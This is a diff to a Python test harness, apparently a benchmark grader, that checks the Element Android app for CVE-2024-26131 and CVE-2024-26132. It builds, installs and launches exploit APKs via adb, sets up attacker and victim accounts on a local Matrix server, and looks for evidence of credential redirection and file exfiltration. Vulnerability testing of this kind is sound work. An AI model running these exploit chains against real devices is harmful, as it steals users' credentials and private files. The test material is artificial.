@@ -15,9 +15,11 @@ from typing import Any, Dict, Tuple
 def run_adb_command(command: str) -> Tuple[bool, str]:
     """Run ADB command and return (success, output) tuple"""
     try:
-        result = subprocess.run(
-            f"adb {command}", shell=True, capture_output=True, text=True, timeout=30
-        )
+        result = subprocess.run(f"adb {command}",
+                                shell=True,
+                                capture_output=True,
+                                text=True,
+                                timeout=30)
         return result.returncode == 0, result.stdout.strip()
     except subprocess.TimeoutExpired:
         return False, "TIMEOUT"
@@ -43,22 +45,22 @@ def test_rogue_server_credential_theft() -> Dict[str, Any]:
     rogue_server_url = "http://10.0.2.2:8000"
 
     # Check if Element is installed
-    success, output = run_adb_command("shell pm list packages | grep im.vector.app")
+    success, output = run_adb_command(
+        "shell pm list packages | grep im.vector.app")
     if not success or "im.vector.app" not in output:
         return {
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Element not installed - cannot test rogue server attack",
+            "message":
+            "Element not installed - cannot test rogue server attack"
         }
 
     # Use the malicious app from vuln_scenario_0
-    vuln_scenario_dir = os.path.join(
-        os.path.dirname(__file__), "vuln_scenarios", "vuln_scenario_0"
-    )
-    malicious_apk_path = os.path.join(
-        vuln_scenario_dir, "malicious_app", "dist", "element-exploit.apk"
-    )
+    vuln_scenario_dir = os.path.join(os.path.dirname(__file__),
+                                     "vuln_scenarios", "vuln_scenario_0")
+    malicious_apk_path = os.path.join(vuln_scenario_dir, "malicious_app",
+                                      "dist", "element-exploit.apk")
     build_script = os.path.join(vuln_scenario_dir, "malicious_app", "build.sh")
 
     if not os.path.exists(build_script):
@@ -66,7 +68,7 @@ def test_rogue_server_credential_theft() -> Dict[str, Any]:
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Malicious app build script not found",
+            "message": "Malicious app build script not found"
         }
 
     # Build the exploit APK
@@ -76,21 +78,20 @@ def test_rogue_server_credential_theft() -> Dict[str, Any]:
             shell=True,
             capture_output=True,
             text=True,
-            timeout=120,
-        )
+            timeout=120)
         if result.returncode != 0 or not os.path.exists(malicious_apk_path):
             return {
                 "test": test_name,
                 "success": False,
                 "score": 1,
-                "message": "Failed to build malicious APK",
+                "message": "Failed to build malicious APK"
             }
     except Exception as e:
         return {
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": f"Build error: {str(e)}",
+            "message": f"Build error: {str(e)}"
         }
 
     # Uninstall any existing malicious app
@@ -103,7 +104,7 @@ def test_rogue_server_credential_theft() -> Dict[str, Any]:
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Failed to install malicious APK",
+            "message": "Failed to install malicious APK"
         }
 
     # Clear logcat to capture exploit activity
@@ -113,8 +114,7 @@ def test_rogue_server_credential_theft() -> Dict[str, Any]:
     success, output = run_adb_command(
         f"shell am start -n {attacker_pkg}/{attacker_activity} "
         f"--es exploit_type rogue_server "
-        f"--es rogue_server_url '{rogue_server_url}'"
-    )
+        f"--es rogue_server_url '{rogue_server_url}'")
     if not success:
         # Clean up
         run_adb_command(f"uninstall {attacker_pkg}")
@@ -122,7 +122,7 @@ def test_rogue_server_credential_theft() -> Dict[str, Any]:
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Failed to launch exploit app",
+            "message": "Failed to launch exploit app"
         }
 
     # Wait for exploit to execute
@@ -133,8 +133,7 @@ def test_rogue_server_credential_theft() -> Dict[str, Any]:
 
     # Check for LoginActivity in activity stack
     success, activity_output = run_adb_command(
-        "shell dumpsys activity activities | grep -A 15 LoginActivity"
-    )
+        "shell dumpsys activity activities | grep -A 15 LoginActivity")
 
     # Check logcat for exploit evidence
     success, logcat_output = run_adb_command("logcat -d -s ElementExploit:D")
@@ -142,8 +141,7 @@ def test_rogue_server_credential_theft() -> Dict[str, Any]:
 
     # Check for rogue server URL evidence in logs
     success, rogue_url_check = run_adb_command(
-        "logcat -d | grep -i '10.0.2.2:8000\\|rogue.*server'"
-    )
+        "logcat -d | grep -i '10.0.2.2:8000\\|rogue.*server'")
 
     # Check for LoginConfig evidence
     success, login_config_check = run_adb_command(
@@ -155,37 +153,49 @@ def test_rogue_server_credential_theft() -> Dict[str, Any]:
 
     # Determine if exploit succeeded
     login_active = activity_output and "LoginActivity" in activity_output
-    rogue_evidence = rogue_url_check and (
-        "10.0.2.2" in rogue_url_check or "rogue" in rogue_url_check.lower()
-    )
+    rogue_evidence = rogue_url_check and ("10.0.2.2" in rogue_url_check or
+                                          "rogue" in rogue_url_check.lower())
 
     if login_active and rogue_evidence:
         return {
-            "test": test_name,
-            "success": True,
-            "score": 0,
-            "message": f"CVE-2024-26131 rogue server VULNERABLE - LoginActivity launched with rogue server config (credential theft attack possible - user credentials would be sent to {rogue_server_url})",
+            "test":
+            test_name,
+            "success":
+            True,
+            "score":
+            0,
+            "message":
+            f"CVE-2024-26131 rogue server VULNERABLE - LoginActivity launched with rogue server config (credential theft attack possible - user credentials would be sent to {rogue_server_url})"
         }
     elif login_active:
         return {
-            "test": test_name,
-            "success": True,
-            "score": 0,
-            "message": "CVE-2024-26131 rogue server VULNERABLE - LoginActivity accessible via intent redirection (credential theft possible)",
+            "test":
+            test_name,
+            "success":
+            True,
+            "score":
+            0,
+            "message":
+            "CVE-2024-26131 rogue server VULNERABLE - LoginActivity accessible via intent redirection (credential theft possible)"
         }
     elif exploit_logged:
         return {
             "test": test_name,
             "success": True,
             "score": 0.5,
-            "message": "Rogue server exploit executed but login activity unclear",
+            "message":
+            "Rogue server exploit executed but login activity unclear"
         }
 
     return {
-        "test": test_name,
-        "success": True,
-        "score": 1,
-        "message": "Rogue server credential theft exploit did not succeed - vulnerability appears patched",
+        "test":
+        test_name,
+        "success":
+        True,
+        "score":
+        1,
+        "message":
+        "Rogue server credential theft exploit did not succeed - vulnerability appears patched"
     }
 
 
@@ -225,13 +235,18 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
     try:
         response = requests.post(
             "http://localhost:8008/_matrix/client/v3/login",
-            json={"type": "m.login.password", "user": "bob", "password": "bobpass123"},
-            timeout=10,
-        )
+            json={
+                "type": "m.login.password",
+                "user": "bob",
+                "password": "bobpass123"
+            },
+            timeout=10)
         if response.status_code == 200:
             bob_token = response.json().get("access_token")
-    except Exception:
-        pass
+        else:
+            print(f"Bob login failed with status {response.status_code}: {response.text}")
+    except Exception as e:
+        print(f"Bob login exception: {e}")
 
     room_id = ""
     # Matrix user ID format is @username:homeserver (port is not included in user IDs)
@@ -247,10 +262,9 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
                     "name": "Exfiltrated Data Drop",
                     "preset": "private_chat",
                     "visibility": "private",
-                    "topic": "CVE-2024-26132 File Exfiltration Test",
+                    "topic": "CVE-2024-26132 File Exfiltration Test"
                 },
-                timeout=10,
-            )
+                timeout=10)
             print(f"Room creation response: {response.status_code}")
             if response.status_code == 200:
                 room_id = response.json().get("room_id")
@@ -265,9 +279,9 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
                             f"http://localhost:8008/_matrix/client/v3/rooms/{room_id}/invite",
                             headers={"Authorization": f"Bearer {bob_token}"},
                             json={"user_id": alice_user_id},
-                            timeout=10,
-                        )
-                        print(f"Invite response: {invite_response.status_code}")
+                            timeout=10)
+                        print(
+                            f"Invite response: {invite_response.status_code}")
                         if invite_response.status_code == 200:
                             print(f"Invited {alice_user_id} to room {room_id}")
                             # Give Alice time to receive the invite
@@ -282,15 +296,15 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
                                     json={
                                         "type": "m.login.password",
                                         "user": "alice",
-                                        "password": "alicepass123",
+                                        "password": "alicepass123"
                                     },
-                                    timeout=10,
-                                )
+                                    timeout=10)
                                 print(
                                     f"Alice login response: {alice_login.status_code}"
                                 )
                                 if alice_login.status_code == 200:
-                                    alice_token = alice_login.json().get("access_token")
+                                    alice_token = alice_login.json().get(
+                                        "access_token")
                                     print(
                                         f"Got Alice token: {alice_token[:20] if alice_token else 'None'}..."
                                     )
@@ -300,10 +314,10 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
                                         join_response = requests.post(
                                             f"http://localhost:8008/_matrix/client/v3/rooms/{room_id}/join",
                                             headers={
-                                                "Authorization": f"Bearer {alice_token}"
+                                                "Authorization":
+                                                f"Bearer {alice_token}"
                                             },
-                                            timeout=10,
-                                        )
+                                            timeout=10)
                                         print(
                                             f"Alice join response: {join_response.status_code}"
                                         )
@@ -316,14 +330,16 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
                                                 msg_response = requests.post(
                                                     f"http://localhost:8008/_matrix/client/v3/rooms/{room_id}/send/m.room.message",
                                                     headers={
-                                                        "Authorization": f"Bearer {alice_token}"
+                                                        "Authorization":
+                                                        f"Bearer {alice_token}"
                                                     },
                                                     json={
-                                                        "msgtype": "m.text",
-                                                        "body": "Alice joined the room - CVE-2024-26132 attack setup complete",
+                                                        "msgtype":
+                                                        "m.text",
+                                                        "body":
+                                                        "Alice joined the room - CVE-2024-26132 attack setup complete"
                                                     },
-                                                    timeout=10,
-                                                )
+                                                    timeout=10)
                                                 print(
                                                     f"Alice message response: {msg_response.status_code}"
                                                 )
@@ -343,33 +359,36 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
 
     # Fallback: Use environment variable or existing room
     if not room_id:
-        room_id = os_module.environ.get("ROOM_ID", "")
+        room_id = os_module.environ.get('ROOM_ID', '')
 
     if not room_id:
         return {
-            "test": test_name,
-            "success": False,
-            "score": 1,
-            "message": "Could not create attacker room - Matrix server not available. Set ROOM_ID environment variable with existing room to test.",
+            "test":
+            test_name,
+            "success":
+            False,
+            "score":
+            1,
+            "message":
+            "Could not create attacker room - Matrix server not available. Set ROOM_ID environment variable with existing room to test."
         }
 
     # Check if Element is installed
-    success, output = run_adb_command("shell pm list packages | grep im.vector.app")
+    success, output = run_adb_command(
+        "shell pm list packages | grep im.vector.app")
     if not success or "im.vector.app" not in output:
         return {
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Element not installed - cannot test file exfiltration",
+            "message": "Element not installed - cannot test file exfiltration"
         }
 
     # Use the malicious app from vuln_scenario_2
-    vuln_scenario_dir = os.path.join(
-        os.path.dirname(__file__), "vuln_scenarios", "vuln_scenario_2"
-    )
-    malicious_apk_path = os.path.join(
-        vuln_scenario_dir, "malicious_app", "dist", "element-exfiltrate.apk"
-    )
+    vuln_scenario_dir = os.path.join(os.path.dirname(__file__),
+                                     "vuln_scenarios", "vuln_scenario_2")
+    malicious_apk_path = os.path.join(vuln_scenario_dir, "malicious_app",
+                                      "dist", "element-exfiltrate.apk")
     build_script = os.path.join(vuln_scenario_dir, "malicious_app", "build.sh")
 
     if not os.path.exists(build_script):
@@ -377,7 +396,7 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Malicious app build script not found",
+            "message": "Malicious app build script not found"
         }
 
     # Build the exploit APK
@@ -387,21 +406,20 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
             shell=True,
             capture_output=True,
             text=True,
-            timeout=120,
-        )
+            timeout=120)
         if result.returncode != 0 or not os.path.exists(malicious_apk_path):
             return {
                 "test": test_name,
                 "success": False,
                 "score": 1,
-                "message": "Failed to build malicious APK",
+                "message": "Failed to build malicious APK"
             }
     except Exception as e:
         return {
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": f"Build error: {str(e)}",
+            "message": f"Build error: {str(e)}"
         }
 
     # Uninstall any existing malicious app
@@ -414,7 +432,7 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Failed to install malicious APK",
+            "message": "Failed to install malicious APK"
         }
 
     # Clear logcat to capture exploit activity
@@ -424,8 +442,7 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
     success, output = run_adb_command(
         f"shell am start -n {attacker_pkg}/{attacker_activity} "
         f"--es target_file '{target_file}' "
-        f"--es room_id '{room_id}'"
-    )
+        f"--es room_id '{room_id}'")
     if not success:
         # Clean up
         run_adb_command(f"uninstall {attacker_pkg}")
@@ -433,7 +450,7 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
             "test": test_name,
             "success": False,
             "score": 1,
-            "message": "Failed to launch exploit app",
+            "message": "Failed to launch exploit app"
         }
 
     # Wait for exploit to execute and file to be sent
@@ -444,20 +461,20 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
 
     # Check for IncomingShareActivity in activity stack
     success, activity_output = run_adb_command(
-        "shell dumpsys activity activities | grep -A 15 IncomingShareActivity"
-    )
+        "shell dumpsys activity activities | grep -A 15 IncomingShareActivity")
 
     # Check logcat for exploit evidence
-    success, logcat_output = run_adb_command("logcat -d -s ElementExfiltrate:D")
+    success, logcat_output = run_adb_command(
+        "logcat -d -s ElementExfiltrate:D")
     exploit_logged = "FILE EXFILTRATION" in logcat_output if logcat_output else False
 
     # Check for FileProvider URI evidence in logs
     success, fileprovider_check = run_adb_command(
-        "logcat -d | grep -i 'multipicker.fileprovider\\|external_files'"
-    )
+        "logcat -d | grep -i 'multipicker.fileprovider\\|external_files'")
 
     # Check for target file being read/accessed
-    success, file_check = run_adb_command(f"logcat -d | grep -i '{target_file}'")
+    success, file_check = run_adb_command(
+        f"logcat -d | grep -i '{target_file}'")
 
     # CRITICAL: Check if file was actually sent to the room (not just activity launched)
     # Look for evidence of file upload/send in Element logs
@@ -466,25 +483,22 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
     )
 
     # Check for room ID in logs (indicates file was sent to specific room)
-    success, room_evidence = run_adb_command(f"logcat -d | grep -i '{room_id}'")
+    success, room_evidence = run_adb_command(
+        f"logcat -d | grep -i '{room_id}'")
 
     # Check for successful file share completion
     success, share_complete = run_adb_command(
-        "logcat -d | grep -iE 'share.*complete|file.*sent|upload.*success'"
-    )
+        "logcat -d | grep -iE 'share.*complete|file.*sent|upload.*success'")
 
     # Clean up malicious app
     run_adb_command(f"uninstall {attacker_pkg}")
 
     # Determine if exploit succeeded
     share_active = activity_output and "IncomingShareActivity" in activity_output
-    fileprovider_evidence = (
-        fileprovider_check and "multipicker.fileprovider" in fileprovider_check
-    )
+    fileprovider_evidence = fileprovider_check and "multipicker.fileprovider" in fileprovider_check
     file_sent = file_send_evidence and any(
         keyword in file_send_evidence.lower()
-        for keyword in ["upload", "send", "attachment"]
-    )
+        for keyword in ['upload', 'send', 'attachment'])
     room_targeted = room_evidence and room_id in room_evidence
 
     # Check if room selection UI is shown (indicates FileProvider worked but room ID invalid)
@@ -492,8 +506,8 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
         "shell dumpsys activity activities | grep -iE 'RoomList|ShareTo|ChooseRoom'"
     )
     room_selection_shown = room_list_check and any(
-        keyword in room_list_check for keyword in ["RoomList", "ShareTo", "ChooseRoom"]
-    )
+        keyword in room_list_check
+        for keyword in ['RoomList', 'ShareTo', 'ChooseRoom'])
 
     # STEP 4: Verify if file was actually received in Bob's room (attacker confirmation)
     file_received_by_attacker = False
@@ -504,8 +518,7 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
                 f"http://localhost:8008/_matrix/client/v3/rooms/{room_id}/messages",
                 headers={"Authorization": f"Bearer {bob_token}"},
                 params={"limit": 10},
-                timeout=10,
-            )
+                timeout=10)
             if response.status_code == 200:
                 messages = response.json().get("chunk", [])
                 # Look for file message type
@@ -522,54 +535,82 @@ def test_file_exfiltration_cve_2024_26132() -> Dict[str, Any]:
     # Strongest evidence: File was actually sent and received by attacker
     if file_received_by_attacker:
         return {
-            "test": test_name,
-            "success": True,
-            "score": 0,
-            "message": f"CVE-2024-26132 CRITICAL VULNERABILITY CONFIRMED - Complete attack chain demonstrated! (1) Attacker Bob created room '{room_id}', (2) Alice joined room, (3) Malicious app exfiltrated Alice's file '{target_file}' containing private credentials to Bob's room WITHOUT Alice's interaction, (4) Bob successfully received Alice's sensitive data. Real-world data exfiltration attack successful!",
+            "test":
+            test_name,
+            "success":
+            True,
+            "score":
+            0,
+            "message":
+            f"CVE-2024-26132 CRITICAL VULNERABILITY CONFIRMED - Complete attack chain demonstrated! (1) Attacker Bob created room '{room_id}', (2) Alice joined room, (3) Malicious app exfiltrated Alice's file '{target_file}' containing private credentials to Bob's room WITHOUT Alice's interaction, (4) Bob successfully received Alice's sensitive data. Real-world data exfiltration attack successful!"
         }
     # Strong evidence: File was sent (based on logs)
-    elif share_active and file_sent and (fileprovider_evidence or room_targeted):
+    elif share_active and file_sent and (fileprovider_evidence
+                                         or room_targeted):
         return {
-            "test": test_name,
-            "success": True,
-            "score": 0,
-            "message": f"CVE-2024-26132 file exfiltration VULNERABLE - File '{target_file}' was automatically sent to attacker room '{room_id}' without user interaction. Check Element app to verify file was received. (IncomingShareActivity + FileProvider exploit confirmed)",
+            "test":
+            test_name,
+            "success":
+            True,
+            "score":
+            0,
+            "message":
+            f"CVE-2024-26132 file exfiltration VULNERABLE - File '{target_file}' was automatically sent to attacker room '{room_id}' without user interaction. Check Element app to verify file was received. (IncomingShareActivity + FileProvider exploit confirmed)"
         }
     # Strong evidence: Room selection shown = FileProvider URI was successfully read
     elif share_active and (fileprovider_evidence or room_selection_shown):
         return {
-            "test": test_name,
-            "success": True,
-            "score": 0,
-            "message": f"CVE-2024-26132 file exfiltration VULNERABLE - External malicious app successfully accessed Element's private file '{target_file}' via FileProvider. File is being sent to room '{room_id}'. Check Element app to verify file delivery - vulnerability allows exfiltration to ANY Matrix room without user consent.",
+            "test":
+            test_name,
+            "success":
+            True,
+            "score":
+            0,
+            "message":
+            f"CVE-2024-26132 file exfiltration VULNERABLE - External malicious app successfully accessed Element's private file '{target_file}' via FileProvider. File is being sent to room '{room_id}'. Check Element app to verify file delivery - vulnerability allows exfiltration to ANY Matrix room without user consent."
         }
     # Medium evidence: IncomingShareActivity launched
     elif share_active:
         return {
-            "test": test_name,
-            "success": True,
-            "score": 0,
-            "message": "CVE-2024-26132 file exfiltration VULNERABLE - IncomingShareActivity accessible to external apps, allowing file exfiltration to any room via EXTRA_SHORTCUT_ID",
+            "test":
+            test_name,
+            "success":
+            True,
+            "score":
+            0,
+            "message":
+            "CVE-2024-26132 file exfiltration VULNERABLE - IncomingShareActivity accessible to external apps, allowing file exfiltration to any room via EXTRA_SHORTCUT_ID"
         }
     elif exploit_logged:
         return {
-            "test": test_name,
-            "success": True,
-            "score": 0.5,
-            "message": "File exfiltration exploit executed but activity launch unclear",
+            "test":
+            test_name,
+            "success":
+            True,
+            "score":
+            0.5,
+            "message":
+            "File exfiltration exploit executed but activity launch unclear"
         }
 
     return {
-        "test": test_name,
-        "success": True,
-        "score": 1,
-        "message": "File exfiltration exploit did not succeed - vulnerability appears patched",
+        "test":
+        test_name,
+        "success":
+        True,
+        "score":
+        1,
+        "message":
+        "File exfiltration exploit did not succeed - vulnerability appears patched"
     }
 
 
 def main():
     """Run all confidentiality tests"""
-    tests = [test_file_exfiltration_cve_2024_26132, test_rogue_server_credential_theft]
+    tests = [
+        test_file_exfiltration_cve_2024_26132,
+        test_rogue_server_credential_theft
+    ]
 
     results = []
     total_score = 0
@@ -586,7 +627,7 @@ def main():
     output = {
         "score": final_score,
         "details": results,
-        "summary": f"Confidentiality tests completed. Score: {final_score}",
+        "summary": f"Confidentiality tests completed. Score: {final_score}"
     }
 
     print(json.dumps(output))
